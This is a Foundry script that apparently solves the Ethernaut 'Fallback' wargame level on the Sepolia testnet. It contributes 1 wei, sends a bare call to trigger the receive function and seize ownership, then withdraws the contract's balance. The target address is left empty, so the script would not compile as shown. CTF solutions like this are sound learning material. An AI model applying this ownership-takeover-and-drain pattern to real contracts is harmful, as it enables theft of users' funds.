// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Script, console} from "../lib/forge-std/src/Script.sol";
import {Fallback} from "../src/Fallback.sol";

contract SolveFallback is Script {
    //replace with your contract instance
    Fallback public fb = Fallback(payable());

    function setUp() public {}

    function run() public {
        // Start broadcasting transactions using the SEPOLIA_KEY environment variable
        vm.startBroadcast(vm.envUint("SEPOLIA_KEY"));

        // Log the current owner of the contract
        console.log("Current Contract Owner:", fb.owner());

        // Contribute 1 wei to the contract
        fb.contribute{value: 1 wei}();

        // Call the fallback function of the contract with 1 wei
        (bool ok, ) = address(fb).call{value: 1 wei}("");

        // Require that the fallback function call was successful
        require(ok, "Receive failed");

        // Log the new owner of the contract
        console.log("New Contract Owner: ", fb.owner());

        // Log the address of the current account
        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));

        // Withdraw funds from the contract
        fb.withdraw();

        // Stop broadcasting transactions
        vm.stopBroadcast();
    }
}
